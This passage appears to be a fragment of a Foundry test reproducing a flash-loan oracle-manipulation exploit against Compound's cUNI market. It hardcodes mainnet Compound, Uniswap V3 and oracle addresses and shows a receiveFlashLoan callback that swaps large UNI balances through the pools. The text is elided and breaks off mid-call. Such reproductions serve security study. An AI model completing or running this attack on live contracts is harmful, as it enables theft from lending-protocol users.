...
contract ContractTest is Test {
    ...
    ICompoundcUSDC public cUSDC =
        ICompoundcUSDC(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    IComptroller public comptroller =
        IComptroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IcUniToken public cUniToken =
        IcUniToken(0x35A18000230DA775CAc24873d00Ff85BccdeD550);
    IUNIV3Pool public UNI_WETH_Pool =
        IUNIV3Pool(0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801);
    IUNI public uni = IUNI(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IUNIV3Pool public WETH_USDC_Pool =
        IUNIV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IWETH public WETH =
        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniswapAnchoredView public UniswapAnchoredView =
        IUniswapAnchoredView(0x50ce56A3239671Ab62f185704Caedf626352741e);
    ...
    function receiveFlashLoan(
        ...
        (, uint256 myTotalLiquidity, ) = comptroller.getAccountLiquidity(
            address(this)
        );
        ...
        UNI_WETH_Pool.swap(
            address(this),
            true,
            int256(uni.balanceOf(address(this))),
            42_095_128_740,
            bytes("")
        );
        WETH_USDC_Pool.swap(
